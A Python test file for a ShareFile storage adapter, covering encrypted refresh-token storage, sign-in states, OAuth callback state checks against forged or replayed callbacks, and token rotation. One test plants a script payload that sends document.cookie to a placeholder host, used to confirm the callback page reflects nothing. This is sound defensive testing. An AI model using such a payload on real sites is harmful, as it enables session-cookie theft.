"""P89 - ShareFile, and the login a person does once.

The conformance suite in `tests/p03` already runs this adapter over the same three files
as the local folder and as Box. What is here is what ShareFile alone brings: a login that
a program cannot perform, a refresh token that rotates, a callback that anybody's page can
cause, and three states that have to read as three different things.
"""

from __future__ import annotations

import ast
from pathlib import Path
from typing import Any

import pytest

from admin.connection import SHAREFILE_STEPS, probe_sharefile
from ports.storage import FileRef
from ports.storage.sharefile import CREDENTIALS, EXPIRED, SERVICE, ShareFileStorage
from ports.storage.tokens import NEVER, PRESENT, StoredToken, TokenStore, now
from registries.errors import RegistryError
from tests.fake_sharefile import ROOT_ID, Credentials, FakeShareFile, signed_in, without

HERE = Path(__file__).resolve()
ROOT = HERE.parents[2]


@pytest.fixture
def folder(tmp_path: Path) -> Path:
    inbox = tmp_path / "inbox"
    inbox.mkdir()
    (inbox / "TB_FY25.xlsx").write_bytes(b"trial balance")
    (inbox / "statements").mkdir()
    (inbox / "statements" / "BS.pdf").write_bytes(b"balance sheet")
    return inbox


def store_for(folder: Path, secrets: Any, name: str = "tokens") -> TokenStore:
    """A token file per store.

    Each `Credentials()` generates its own vault key, so two stores sharing a path would
    have the second read a file the first encrypted under a different key. That is a
    fixture artefact rather than anything about the code, and it would have shown up as a
    confusing refusal in whichever test happened to run second.
    """
    return TokenStore(secrets, folder.parent / f"{name}.enc")


def adapter(
    folder: Path, *, secrets: Any = None, token: str = "rt-1", **kwargs: Any
) -> tuple[ShareFileStorage, FakeShareFile, TokenStore]:
    held = secrets or Credentials()
    fake = FakeShareFile(folder, **kwargs)
    if token:
        fake.issued.append(token)
    store = store_for(folder, held, f"tokens-{len(kwargs)}-{token or 'none'}-{id(held)}")
    if token:
        signed_in(store, token=token)
    return (
        ShareFileStorage(ROOT_ID, secrets=held, tokens=store, transport=fake.transport()),
        fake,
        store,
    )


def status_of(report: Any) -> dict[str, str]:
    return {s.id: s.status for s in report.steps}


# ============================================================ the token at rest


def test_a_refresh_token_is_not_readable_in_the_file_it_is_written_to(
    folder: Path,
) -> None:
    """It is worth as much as the password that made it, and it lives on disk between
    sessions because that is the whole point of a refresh token."""
    held = Credentials()
    store = store_for(folder, held)
    store.write(StoredToken(SERVICE, "rt-supersecret-9f2", "chartwell", now()))
    raw = store.path.read_bytes()
    assert b"rt-supersecret-9f2" not in raw
    assert b"chartwell" not in raw, "the subdomain is in the same blob, so it goes too"


def test_the_stored_token_round_trips(folder: Path) -> None:
    held = Credentials()
    store = store_for(folder, held)
    store.write(StoredToken(SERVICE, "rt-1", "chartwell", "2026-09-21T10:00:00+00:00"))
    back = store.read(SERVICE)
    assert back is not None
    assert back.refresh_token == "rt-1" and back.subdomain == "chartwell"


def test_a_token_never_reaches_a_repr(folder: Path) -> None:
    """repr is where a credential ends up in a traceback or a log line."""
    held = Credentials()
    store = store_for(folder, held)
    stored = StoredToken(SERVICE, "rt-supersecret-9f2", "chartwell", now())
    assert "rt-supersecret" not in repr(stored)
    assert "rt-supersecret" not in repr(store)
    storage, _, _ = adapter(folder)
    assert "rt-" not in repr(storage)


def test_the_token_file_is_somewhere_git_already_ignores() -> None:
    """A new directory would need a new ignore rule, and a new ignore rule is a thing
    somebody can forget while the file is already written."""
    from ports.storage.tokens import DEFAULT_PATH

    ignored = (ROOT / ".gitignore").read_text(encoding="utf-8").split()
    assert DEFAULT_PATH.split("/")[0] + "/" in ignored


def test_a_file_encrypted_under_another_key_refuses_rather_than_reading_as_empty(
    folder: Path,
) -> None:
    """An empty store and an unreadable one mean different things: the first says sign in,
    the second says something is wrong with the key. Treating the second as the first
    would silently discard a working login."""
    first = Credentials()
    store_for(folder, first).write(StoredToken(SERVICE, "rt-1", "chartwell", now()))
    with pytest.raises(RegistryError) as refused:
        store_for(folder, Credentials()).read(SERVICE)
    assert refused.value.diagnostic.code == "CONFIG.CREDENTIAL_REFUSED"


def test_the_encryption_key_is_not_the_vault_key_itself(folder: Path) -> None:
    """Domain separation: the bytes that encrypt a refresh token are not the bytes that
    encrypt a client's name, even though both come from AA_VAULT_KEY."""
    from cryptography.fernet import Fernet, InvalidToken

    held = Credentials()
    store = store_for(folder, held)
    store.write(StoredToken(SERVICE, "rt-1", "chartwell", now()))
    # InvalidToken and not Exception: a blind raises() here would pass if the vault key
    # were not even a valid Fernet key, which is a different bug and not this claim.
    with pytest.raises(InvalidToken):
        Fernet(str(held.get("AA_VAULT_KEY")).encode()).decrypt(store.path.read_bytes())


# ============================================================ three states


def test_a_machine_nobody_signed_in_on_says_so_rather_than_failing(folder: Path) -> None:
    """Day one is not a fault. A report that called it one would be read as something
    being broken, and somebody would go looking for the break."""
    held = Credentials()
    fake = FakeShareFile(folder)
    storage = ShareFileStorage(
        ROOT_ID,
        secrets=held,
        tokens=store_for(folder, held, "day-one"),
        transport=fake.transport(),
    )
    assert storage.sign_in_state() == NEVER

    report = probe_sharefile(storage, held)
    assert status_of(report)["credentials"] == "pass"
    assert status_of(report)["signed_in"] == "fail"
    detail = dict((s.id, s.detail) for s in report.steps)["signed_in"]
    assert "cannot be signed in by a program" in detail
    assert "Sign in" in detail


def test_signed_in_but_revoked_is_a_different_report_from_never(folder: Path) -> None:
    """One says sign in, the other says sign in *again* - and the second usually means
    somebody revoked something, which is worth knowing before doing it."""
    held = Credentials()
    never = ShareFileStorage(
        ROOT_ID,
        secrets=held,
        tokens=store_for(folder, held, "nobody-signed-in"),
        transport=FakeShareFile(folder).transport(),
    )
    revoked, _, _ = adapter(folder, refuse_refresh=True)

    first = probe_sharefile(never, held)
    second = probe_sharefile(revoked, Credentials())
    assert status_of(first)["signed_in"] == "fail"
    assert status_of(second)["signed_in"] == "pass"
    assert status_of(second)["token"] == "fail"
    assert first.failed and second.failed
    assert first.failed.id != second.failed.id


def test_a_revoked_token_does_not_read_as_something_to_retry(folder: Path) -> None:
    """A run that retried this would loop doing nothing. The words have to say that the
    repair is a person."""
    storage, _, _ = adapter(folder, refuse_refresh=True)
    with pytest.raises(RegistryError) as refused:
        storage.list()
    d = refused.value.diagnostic
    assert d.code == "CONFIG.CREDENTIAL_REFUSED"
    assert d.retryable is False
    assert "Sign in again" in d.detail
    assert EXPIRED in d.locator


def test_all_five_steps_pass_once_somebody_has_signed_in(folder: Path) -> None:
    storage, _, _ = adapter(folder)
    report = probe_sharefile(storage, Credentials())
    assert report.connected
    assert [s.id for s in report.steps] == [step for step, _ in SHAREFILE_STEPS]
    assert set(status_of(report).values()) == {"pass"}


def test_sharefile_asks_one_question_box_does_not() -> None:
    """The extra step is the whole difference between the two services, and folding it
    into the token step would produce one message covering 'open a browser' and 'your
    token was revoked'."""
    from admin.connection import BOX_STEPS

    assert {s for s, _ in SHAREFILE_STEPS} - {s for s, _ in BOX_STEPS} == {"signed_in"}


# ============================================================ the callback anybody can cause


def test_a_callback_with_a_state_nobody_issued_is_refused(folder: Path) -> None:
    """This server answers to anything that can make a browser navigate to 127.0.0.1, and
    a callback is a plain GET with no Origin - so the request gate cannot tell this
    redirect from one another site arranged. Without the state check, a page could attach
    this tool to somebody else's ShareFile account."""
    from admin.console import AdminRefused

    console = _console()
    with pytest.raises(AdminRefused) as refused:
        console.finish_sharefile_login("a-code", "a-state-nobody-issued", "http://x/cb")
    assert refused.value.diagnostic.code == "CONFIG.ADMIN_FORBIDDEN"


def test_a_state_is_accepted_once(folder: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Replaying a callback is the same attack a second time.

    The adapter is stubbed rather than built, for two reasons. The first call has to
    *succeed* for this to prove that a good state is consumed rather than that a bad one
    fails twice. And a real adapter here would try to reach sharefile.com on any machine
    that has the credentials set, which is not a thing a test may do.
    """
    import ports
    from admin.console import AdminRefused

    exchanged: list[str] = []

    class Stub:
        def finish_login(self, code: str, redirect_uri: str) -> StoredToken:
            exchanged.append(code)
            return StoredToken(SERVICE, "rt-1", "chartwell", now())

    monkeypatch.setattr(ports, "build_port", lambda port, adapter: Stub())

    console = _console()
    console._logins["s1"] = _monotonic()
    assert console.finish_sharefile_login("code", "s1", "http://x/cb")["signed_in"]
    assert exchanged == ["code"]

    with pytest.raises(AdminRefused) as second:
        console.finish_sharefile_login("code", "s1", "http://x/cb")
    assert second.value.diagnostic.code == "CONFIG.ADMIN_FORBIDDEN"
    assert exchanged == ["code"], "the replay never reached the exchange"


def test_an_empty_state_is_refused(folder: Path) -> None:
    """The degenerate case: a callback with no state at all must not slip through a check
    written as "does it match"."""
    from admin.console import AdminRefused

    with pytest.raises(AdminRefused):
        _console().finish_sharefile_login("code", "", "http://x/cb")


def test_a_started_sign_in_expires(folder: Path) -> None:
    """A state kept forever is a growing list of values that would still be honoured."""
    from admin.console import LOGIN_WINDOW_SECONDS, AdminRefused

    console = _console()
    console._logins["old"] = _monotonic() - LOGIN_WINDOW_SECONDS - 1
    console._forget_stale_logins()
    with pytest.raises(AdminRefused):
        console.finish_sharefile_login("code", "old", "http://x/cb")


def test_the_login_url_cannot_be_built_without_a_state(folder: Path) -> None:
    """One call returns both, so there is no shape of this API that produces a URL with
    no state in it."""
    storage, _, _ = adapter(folder, token="")
    url, state = storage.begin_login("http://127.0.0.1:8000/cb")
    assert state and f"state={state}" in url
    assert "response_type=code" in url and "chartwell.sharefile.com" in url


def test_the_page_returned_to_the_browser_echoes_nothing_from_the_callback() -> None:
    """A callback's values are chosen by whoever sent the browser here. Reflecting one
    would put somebody else's text on this machine's own origin."""
    from admin.app import _signed_in_page

    planted = "<script>fetch('http://elsewhere/'+document.cookie)</script>"
    for page in (_signed_in_page(""), _signed_in_page(planted)):
        assert planted not in page
        assert "<script" not in page
    # And the two pages differ, so refusing is still visible to whoever is looking at it.
    assert _signed_in_page("") != _signed_in_page(planted)


# ============================================================ rotation


def test_a_rotated_refresh_token_replaces_the_stored_one(folder: Path) -> None:
    """ShareFile hands back a new one on some refreshes. Keeping the old gives a login
    that works once and then does not - which presents as an intermittent fault."""
    storage, fake, store = adapter(folder, rotate=True)
    storage.list()
    held = store.read(SERVICE)
    assert held is not None
    assert held.refresh_token == fake.issued[-1] != "rt-1"


def test_the_next_session_uses_the_rotated_token(folder: Path) -> None:
    """The test that would have caught dropping it: the fake refuses a spent token, so a
    second adapter reading the store either works or proves the rotation was lost."""
    storage, fake, store = adapter(folder, rotate=True)
    storage.list()

    held = Credentials()
    again = ShareFileStorage(
        ROOT_ID, secrets=held, tokens=store, transport=fake.transport()
    )
    assert again.list(), "the stored token was the spent one"


def test_a_login_that_returns_no_refresh_token_is_refused(folder: Path) -> None:
    """It would work for an hour and then stop, which is the worst way for this to fail:
    long enough to look fine, and then silence in the middle of something."""
    storage, _, _ = adapter(folder, token="", no_refresh_token=True)
    with pytest.raises(RegistryError) as refused:
        storage.finish_login("a-code", "http://127.0.0.1:8000/cb")
    assert "offline access" in refused.value.diagnostic.detail


def test_a_completed_login_leaves_a_token_behind(folder: Path) -> None:
    storage, fake, store = adapter(folder, token="")
    stored = storage.finish_login("a-code", "http://127.0.0.1:8000/cb")
    assert store.read(SERVICE) is not None
    assert stored.refresh_token in fake.issued
    assert store.state(SERVICE) == PRESENT


def test_forgetting_drops_it(folder: Path) -> None:
    """A token can be revoked at the other end, and somebody who knows that should be able
    to say so rather than waiting for a confusing refusal."""
    _, _, store = adapter(folder)
    assert store.forget(SERVICE) is True
    assert store.state(SERVICE) == NEVER
    assert store.forget(SERVICE) is False


# ============================================================ reading, and honesty


def test_folders_are_told_from_files_by_the_odata_annotation(folder: Path) -> None:
    """ShareFile types items through an annotation rather than a field, and being wrong
    puts folders into a list of documents - which downstream tries to read and reports as
    unreadable."""
    storage, _, _ = adapter(folder)
    assert [r.path for r in storage.list()] == ["TB_FY25.xlsx", "statements/BS.pdf"]


def test_the_hash_is_a_sha256_this_adapter_computed(folder: Path) -> None:
    import hashlib

    storage, _, _ = adapter(folder)
    stat = storage.stat(FileRef("TB_FY25.xlsx"))
    assert stat.content_hash == f"sha256:{hashlib.sha256(b'trial balance').hexdigest()}"


def test_a_missing_root_refuses_rather_than_reading_the_whole_account(
    folder: Path,
) -> None:
    held = Credentials()
    storage = ShareFileStorage(
        "", secrets=held, tokens=store_for(folder, held, "no-root"),
        transport=FakeShareFile(folder).transport(),
    )
    with pytest.raises(RegistryError) as refused:
        storage.list()
    assert refused.value.diagnostic.code == "SCOPE.MISSING_CREDENTIAL"
    assert "every client at once" in refused.value.diagnostic.detail


def test_a_missing_credential_is_named(folder: Path) -> None:
    report = probe_sharefile(*_pair(folder, without("SHAREFILE_CLIENT_SECRET")))
    assert status_of(report)["credentials"] == "fail"
    assert "SHAREFILE_CLIENT_SECRET" in report.steps[0].detail
    assert CREDENTIALS == (
        "SHAREFILE_SUBDOMAIN",
        "SHAREFILE_CLIENT_ID",
        "SHAREFILE_CLIENT_SECRET",
    )


def test_nothing_in_this_phase_can_be_read_as_real_sharefile_answering() -> None:
    """Every ShareFileStorage in this file is built with a replayed transport. One without
    would reach sharefile.com, pass on a machine with credentials, fail everywhere else,
    and be read as evidence the connection works."""
    tree = ast.parse(HERE.read_text(encoding="utf-8"))
    built = [
        node
        for node in ast.walk(tree)
        if isinstance(node, ast.Call)
        and isinstance(node.func, ast.Name)
        and node.func.id == "ShareFileStorage"
    ]
    assert built, "the scan found no constructions, so it is proving nothing"
    for node in built:
        assert any(kw.arg == "transport" for kw in node.keywords), (
            f"ShareFileStorage at line {node.lineno} has no replayed transport"
        )


def test_the_adapter_says_in_its_own_words_that_it_has_never_run() -> None:
    from ports.storage import sharefile as module
    from tests import fake_sharefile

    assert "has spoken to real ShareFile" in (module.__doc__ or "")
    assert "not evidence that ShareFile works" in (fake_sharefile.__doc__ or "")


def _pair(folder: Path, secrets: Any) -> tuple[ShareFileStorage, Any]:
    fake = FakeShareFile(folder)
    return (
        ShareFileStorage(
            ROOT_ID,
            secrets=secrets,
            tokens=store_for(folder, Credentials(), "pair"),
            transport=fake.transport(),
        ),
        secrets,
    )


def _monotonic() -> float:
    import time

    return time.monotonic()


def _console() -> Any:
    from unittest.mock import Mock

    from admin.console import AdminConsole

    preflight = Mock()
    preflight.secrets = Credentials()
    return AdminConsole(Mock(), Mock(), preflight, constraints=Mock())
